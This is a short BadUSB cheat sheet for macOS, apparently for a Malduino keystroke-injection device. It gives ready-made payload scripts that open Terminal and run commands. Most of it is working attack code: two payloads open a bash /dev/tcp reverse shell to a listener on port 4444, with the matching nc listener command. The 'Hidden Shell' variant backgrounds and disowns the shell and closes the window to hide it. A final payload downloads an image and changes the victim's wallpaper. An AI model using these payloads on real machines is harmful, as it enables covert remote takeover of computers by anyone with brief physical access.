# BadUSb cheatsheet for OSX

http://malduinow.tools/index.html

## Launch a command 

	LED 0 255 0
	DELAY 1000
	LED 0 0 0
	LOCALE US
	DELAY 1000
	GUI SPACE
	DELAY 500
	STRING terminal
	DELAY 500
	ENTER
	DELAY 500
	STRING whoami
	ENTER
	LED 0 255 255

## Reverse shell 
Listener

	nc -lvp 4444
	
Payload

	LED 0 255 0
	DELAY 1000
	LED 0 0 0
	LOCALE US
	DELAY 1000
	GUI SPACE
	DELAY 500
	STRING terminal
	DELAY 500
	ENTER
	DELAY 500
	GUI n
	DELAY 500
	STRING exec 5<>/dev/tcp/127.0.0.1/4444
	ENTER
	STRING cat <&5 | while read line; do $line 2>&5 >&5; done
	ENTER
	LED 0 255 255

Hidden Shell

	LED 0 255 0
	DELAY 1000
	LED 0 0 0
	LOCALE US
	DELAY 1000
	GUI SPACE
	DELAY 500
	STRING terminal
	DELAY 500
	ENTER
	DELAY 500
	STRING exec 5<>/dev/tcp/127.0.0.1/4444
	ENTER
	STRING cat <&5 | while read line; do $line 2>&5 >&5; done
	ENTER
	DELAY 500
	CTRL z
	DELAY 500
	STRING bg
	ENTER
	STRING disown
	ENTER
	GUI w
	ENTER
	LED 0 0 255

## Change wallpaper

Code (make sure it works and modify the payload accordingly)

	curl https://www.kolpaper.com/wp-content/uploads/2020/10/Walking-Duck-Wallpaper-HD.jpg -o /var/tmp/image.jpg
	
	osascript -e 'tell application "Finder" to set desktop picture to POSIX file "/var/tmp/image.jpg"'
	
Payload

	LED 0 255 0
	DELAY 1000
	LED 0 0 0
	LOCALE US
	DELAY 1000
	GUI SPACE
	DELAY 500
	STRING terminal
	DELAY 500
	ENTER
	DELAY 500
	STRING curl https://cdn3.geckoandfly.com/wp-content/uploads/2015/09/android-windows-mac-iphone-prank-4.jpg -o /var/tmp/VWltOoz.jpg
	ENTER
	ENTER
	DELAY 500
	STRING osascript -e 'tell application "Finder" to set desktop picture to POSIX file "/var/tmp/VWltOoz.jpg"'
	ENTER
	ENTER
	DELAY 200
	GUI w
	ENTER
	ENTER
	LED 0 255 255
